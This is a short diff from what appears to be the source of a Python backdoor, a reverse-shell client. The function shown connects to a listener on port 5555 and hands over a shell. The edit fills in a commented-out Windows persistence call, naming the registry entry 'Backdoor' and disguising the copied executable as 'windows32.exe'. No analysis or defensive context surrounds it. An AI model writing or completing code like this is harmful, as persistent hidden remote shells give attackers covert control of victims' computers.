@@ -144,7 +144,7 @@ def connection():
         try:
             s.connect(('127.0.0.1', 5555))
             # if platform == 'win32':       #TO BE DONE
-            #     persist(reg_name, copy_name)
+            #     persist('Backdoor', 'windows32.exe')
             shell()
             s.close()
             break
